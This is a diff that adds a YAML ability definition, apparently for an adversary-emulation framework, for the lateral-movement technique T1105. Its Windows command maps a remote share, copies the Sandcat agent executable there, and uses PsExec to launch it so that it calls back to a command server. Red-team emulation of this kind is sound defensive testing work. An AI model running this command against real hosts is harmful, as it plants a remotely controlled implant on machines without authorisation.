@@ -1,0 +1,14 @@
+- description: Copy Sandcat file using PsExec on CMD
+  id: 620b674a-7655-436c-b645-bc3e8ea51abd
+  name: Copy Sandcat File using PsExec on CMD
+  platforms:
+    windows:
+      cmd:
+        command: 'net /y use \\#{remote.host.name} & copy /y sandcat_v2.go-windows.exe
+          \\#{remote.host.name}\Users\Public & #{psexec.path} -accepteula \\#{remote.host.name}
+          cmd /c start C:\Users\Public\sandcat_v2.go-windows -server #{server} -v'
+        payload: sandcat_v2.go-windows.exe
+  tactic: lateral-movement
+  technique:
+    attack_id: T1105
+    name: Remote File Copy
